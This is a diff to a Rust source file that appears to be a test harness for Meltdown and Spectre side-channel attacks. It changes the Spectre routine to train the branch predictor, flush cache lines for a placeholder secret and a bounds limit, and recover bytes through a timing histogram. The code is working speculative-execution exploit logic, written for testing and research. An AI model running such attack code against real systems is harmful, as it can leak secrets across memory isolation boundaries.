@@ -4,6 +4,9 @@
 #[cfg(feature = "tester")]
 use core::num::Wrapping;
 
+#[cfg(feature = "std")]
+extern crate std;
+
 mod util;
 pub use crate::util::*;
 
@@ -24,10 +27,10 @@ pub static mut BASE_ADDR: usize = 0;
 #[cfg(feature = "tester")]
 pub static mut MIN_NB_CYCLES: u64 = 0;
 #[no_mangle]
-pub static mut SPECTRE_LIMIT: u64 = 64;
+pub static mut SPECTRE_LIMIT: u64 = 16;
 #[no_mangle]
 pub static MINIDOW_SECRET: &[u8; 128] =
-    b"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
+    b"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001234";
 
 #[cfg(feature = "tester")]
 pub trait Method {
@@ -61,7 +64,7 @@ impl Method for Meltdown {
                 // load the data that must be accessed in cache
                 preload_op();
 
-                flush_measurement_area();
+                flush_measurement_area(BASE_ADDR);
 
                 repeat_move_for_training_meltdown();
 
@@ -91,6 +94,8 @@ pub struct Spectre {
     pub nb_cycles_offset: u64,
     training_func: unsafe extern "C" fn(base_addr: usize, off: usize),
     target_func: unsafe extern "C" fn(base_addr: usize, off: usize),
+    spectre_speculation_base: *const i8,
+    spectre_limit_addr: *const u8,
 }
 
 #[cfg(feature = "tester")]
@@ -98,11 +103,17 @@ impl Spectre {
     pub fn new(
         training_func: Option<unsafe extern "C" fn(base_addr: usize, off: usize)>,
         target_func: Option<unsafe extern "C" fn(base_addr: usize, off: usize)>,
+        spectre_speculation_base: Option<*const i8>,
+        spectre_limit_addr: Option<*const u8>,
     ) -> Self {
         Self {
             nb_cycles_offset: 25,
             training_func: training_func.unwrap_or(access_memory_spectre),
             target_func: target_func.unwrap_or(access_memory_spectre),
+            spectre_speculation_base: spectre_speculation_base
+                .unwrap_or(&MINIDOW_SECRET[64] as *const _ as *const i8),
+            spectre_limit_addr: spectre_limit_addr
+                .unwrap_or(unsafe { &SPECTRE_LIMIT as *const _ as *const u8 }),
         }
     }
 }
@@ -120,42 +131,41 @@ impl Method for Spectre {
         dest_array: &mut [u8],
     ) {
         let target = (Wrapping(target_address as usize)
-            - Wrapping(&MINIDOW_SECRET[64] as *const _ as usize))
+            - Wrapping(self.spectre_speculation_base as usize))
         .0;
         let limit = SPECTRE_LIMIT as usize;
         let base_addr = BASE_ADDR;
 
         for i in 0..dest_array.len() {
-            let mut found = false;
-            for _ in 0..1_000 {
+            let mut histogram = [0; 256];
+            for _ in 0..2 * NB_TIMES {
                 // training phase
-                for i in 0..5_000 {
+                for i in 0..50_000 {
                     (self.training_func)(base_addr, i % limit);
                 }
 
                 // attack phase
-                flush_measurement_area();
-                core::arch::x86_64::_mm_prefetch(
-                    &MINIDOW_SECRET[64] as *const _ as *const i8,
-                    core::arch::x86_64::_MM_HINT_T0,
-                );
-                core::arch::x86_64::_mm_clflush(&SPECTRE_LIMIT as *const _ as *const u8);
+                flush_measurement_area(base_addr);
+                core::arch::x86_64::_mm_clflush(self.spectre_speculation_base as *mut u8);
+                core::arch::x86_64::_mm_clflush(self.spectre_limit_addr);
 
                 preload_op();
                 asm!("mfence", "lfence");
 
                 (self.target_func)(base_addr, target + i);
 
-                let measured_byte = measure_byte(self).unwrap_or(0);
-                if measured_byte != 0 {
-                    dest_array[i] = measured_byte;
-                    found = true;
-                    break;
-                }
+                histogram[measure_byte(self).unwrap_or(0) as usize] += 1;
             }
-            if !found {
-                dest_array[i] = 0;
-            }
+            dest_array[i] = if histogram[0] == 2 * NB_TIMES {
+                0
+            } else {
+                histogram[1..]
+                    .iter()
+                    .enumerate()
+                    .max_by(|(_, x), (_, y)| x.cmp(y))
+                    .map(|(x, _)| x as u8 + 1)
+                    .unwrap()
+            };
         }
     }
 }
